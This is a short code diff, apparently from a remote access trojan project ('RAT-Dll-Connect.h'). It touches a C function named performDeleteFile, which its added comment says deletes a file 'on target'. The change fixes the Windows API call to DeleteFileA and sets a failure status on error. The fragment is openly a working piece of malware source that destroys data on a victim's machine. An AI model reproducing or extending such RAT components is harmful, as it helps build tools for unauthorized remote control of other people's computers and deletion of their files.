@@ -6,6 +6,12 @@
 #include "RAT-Dll-Connect.h"
 
 
+/** This function will perform a delete file for us
+params:
+* filePath - path to file on target we're deleting
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
 INT performDeleteFile(__in char* filePath)
 {
 	INT status = SUCCESS;
@@ -14,9 +20,10 @@ INT performDeleteFile(__in char* filePath)
 	sprintf_s(msgBuf, "RAT-Dll-DeleteFile::performDeleteFile - Deleting %s...\n", filePath);
 	OutputDebugStringA(msgBuf);
 
-	if (!DeleteFile((LPCWSTR)filePath))
+	if (!DeleteFileA(filePath))
 	{
 		OutputDebugStringA("RAT-Dll-DeleteFile::performDeleteFile - Failed to delete file!\n");
+		status = FAILURE;
 		goto cleanup;
 	}
 
